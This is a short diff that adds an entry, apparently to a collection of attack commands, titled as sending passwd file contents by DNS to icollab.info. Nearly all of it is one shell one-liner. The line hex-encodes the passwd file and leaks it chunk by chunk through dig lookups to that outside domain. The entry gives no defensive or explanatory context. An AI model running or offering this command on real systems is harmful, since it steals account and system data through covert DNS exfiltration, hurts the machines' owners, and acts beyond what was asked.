@@ -1,0 +1,6 @@
+title:
+	 send passwd file content by DNS to icollab.info
+Command:
+	cat passwd | od -An -t x1 | sed -r 's/\s+//g' | while read line;do dig $line.icollab.info a +short;done
+
+
